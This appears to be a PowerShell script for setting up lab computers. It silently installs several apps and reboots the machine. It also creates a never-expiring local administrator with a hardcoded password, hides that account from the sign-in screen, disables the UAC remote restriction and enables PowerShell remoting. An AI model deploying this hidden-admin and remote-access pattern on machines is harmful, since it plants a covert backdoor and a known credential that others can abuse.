# ==================================================
# LAB MASTER SETUP - POWERSHELL 5.1 SAFE
# ==================================================

# ---------------- ADMIN CHECK (SAFE METHOD) ----------------
net session >nul 2>&1
if ($LASTEXITCODE -ne 0) {
    echo "ERROR: Run this script as Administrator!"
    pause
    exit
}

# ---------------- CONFIG ----------------
$AdminPC = "PC-01"
$User    = "labadmin"
$Pass    = "Lab@12345"

$SecurePass = ConvertTo-SecureString $Pass -AsPlainText -Force

# Script path
if ($PSScriptRoot) {
    $InstallDir = $PSScriptRoot
}
else {
    $InstallDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
}

$LogFile = Join-Path $InstallDir "Setup_Log.txt"

# ---------------- LOGGER ----------------
function Write-Log {

    param(
        [string]$Message,
        [string]$Color = "White"
    )

    $Stamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

    Write-Host "[$Stamp] $Message" -ForegroundColor $Color
    "[$Stamp] $Message" | Out-File $LogFile -Append -Encoding UTF8
}

# ==================================================
# STEP 1 : SYSTEM CONFIG
# ==================================================
Write-Log "STEP 1: System Configuration" "Cyan"

try {

    # Enable sideloading
    $DevKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock"

    if (-not (Test-Path $DevKey)) {
        New-Item $DevKey -Force | Out-Null
    }

    Set-ItemProperty $DevKey AllowAllTrustedApps 1 -Type DWord
    Set-ItemProperty $DevKey AllowDevelopmentWithoutDevLicense 1 -Type DWord


    # Create admin user

    if (Get-Command Get-LocalUser -ErrorAction SilentlyContinue) {

        if (-not (Get-LocalUser $User -ErrorAction SilentlyContinue)) {

            New-LocalUser $User -Password $SecurePass
            Add-LocalGroupMember Administrators $User
            Set-LocalUser $User -PasswordNeverExpires $true
        }
    }
    else {

        if (-not (net user $User 2>$null)) {

            net user $User $Pass /add
            net localgroup Administrators $User /add
        }
    }


    # Hide user
    $HideKey = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"

    if (-not (Test-Path $HideKey)) {
        New-Item $HideKey -Force | Out-Null
    }

    Set-ItemProperty $HideKey $User 0 -Type DWord


    # Disable UAC remote restriction
    Set-ItemProperty `
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
        LocalAccountTokenFilterPolicy 1 `
        -Type DWord


    # Enable remoting
    Enable-PSRemoting -Force -SkipNetworkProfileCheck

    Import-Module Microsoft.WSMan.Management -ErrorAction SilentlyContinue

    Set-Item WSMan:\localhost\Client\TrustedHosts -Value $AdminPC -Force


    Write-Log "Remoting and Sideloading configured" "Green"
}
catch {

    Write-Log "STEP 1 Warning: $($_.Exception.Message)" "Yellow"
}

# ==================================================
# STEP 2 : APP LIST
# ==================================================

$Apps = @(

    @{Name="VC Redist"; File="vc.exe"; Args="/S"}
    @{Name="Chrome";   File="chrome.exe"; Args="/silent /install"}
    @{Name="Notepad++";File="npp.exe"; Args="/S"}
    @{Name="Telegram"; File="telegram.exe"; Args="/S"}

)

# ==================================================
# STEP 3 : INSTALL
# ==================================================
Write-Log "STEP 2: Installing Applications" "Cyan"

foreach ($App in $Apps) {

    $Path = Join-Path $InstallDir $App.File

    if (-not (Test-Path $Path)) {

        Write-Log "Missing: $($App.File)" "Red"
        continue
    }

    Write-Log "Installing $($App.Name)" "Yellow"

    try {

        Start-Process `
            -FilePath $Path `
            -ArgumentList $App.Args `
            -Wait `
            -NoNewWindow

        Write-Log "Installed: $($App.Name)" "Green"
    }
    catch {

        Write-Log "Failed $($App.Name): $($_.Exception.Message)" "Red"
    }
}

# ==================================================
# STEP 4 : REBOOT
# ==================================================
Write-Log "SETUP COMPLETE - REBOOT IN 15s" "Red"

Start-Sleep 15

Restart-Computer -Force
